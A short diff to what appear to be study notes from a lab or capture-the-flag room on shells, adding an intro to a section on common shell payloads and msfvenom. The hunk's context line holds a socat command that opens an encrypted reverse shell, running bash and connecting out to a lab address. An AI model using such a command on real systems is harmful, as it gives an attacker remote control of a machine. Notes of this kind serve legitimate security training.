@@ -369,3 +369,7 @@ socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sa
 ---
 
 ### Task 8: Common Shell Payloads 
+
+We'll soon be looking at generating payloads with msfvenom, but before we do that, let's take a look at some common payloads using the tools we've already covered.  
+
+---
